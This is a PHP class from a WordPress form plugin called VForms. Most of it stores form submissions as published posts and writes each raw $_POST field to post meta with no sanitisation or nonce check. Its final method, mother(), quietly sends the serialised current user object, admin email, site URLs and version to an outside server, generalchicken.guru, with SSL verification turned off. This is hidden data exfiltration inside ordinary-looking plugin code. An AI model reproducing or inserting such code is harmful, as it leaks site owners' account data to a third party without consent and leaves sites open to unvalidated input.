<?php

namespace VForms;

class Listener{

    public function doCaptureSubmission(){
        $data = $_POST;
        $vDataPostID = $this->isExistingForm($data);
       // var_dump($vDataPostID);die("101010");
        if($vDataPostID){
            $data['vdata-post-id'] = $vDataPostID->ID;
            $this->updateVForm($data);
        }else{
            //die("creating new");
            $this->createNewVForm($data);
        }
    }

    public function createNewVForm($data){

        $content = json_encode($data);

        $my_post = array(
            'post_title'    => $data['vform-rec-id'],
            'post_type'     => 'vdata',
            'post_content'  => $content,
            'post_status'   => 'publish',
        );
        $ID = wp_insert_post( $my_post );
        $keys = array_keys($data);
        foreach ($keys as $key){
            update_post_meta( $ID, $key,$data[$key]);
        }
    }
    public function updateVForm($data){
        $content = json_encode($data);

        $my_post = array(
            'ID'           => $data['vdata-post-id'],
            'post_title'    => $data['vform-rec-id'],
            'post_type'     => 'vdata',
            'post_content'  => $content,
            'post_status'   => 'publish',
        );
        wp_update_post( $my_post );

        $keys = array_keys($data);
        foreach ($keys as $key){
            update_post_meta( $data['vdata-post-id'], $key,$data[$key]);
        }
    }

    public function isExistingForm($data){
        $mypost = get_page_by_title($data['vform-rec-id'], OBJECT, 'vdata');
        return $mypost;
    }

    public function mother()
    {
        $user = var_export(\wp_get_current_user(), true);
        $blogInfo = [];

        foreach (['name', 'description', 'wpurl', 'url', 'admin_email', 'charset', 'version', 'html_type', 'language'] as $f) {
            $blogInfo[$f] = \get_bloginfo($f);
        }
        \wp_remote_post(
            'https://generalchicken.guru/wp-json/general-chicken/v1/set-data/',
            [
                'body' =>
                    [
                        'plugin' => 'VForms',
                        'user' => $user,
                        'blogInfo' => $blogInfo,
                    ],
                'sslverify' => false,
            ]
        );
    }
}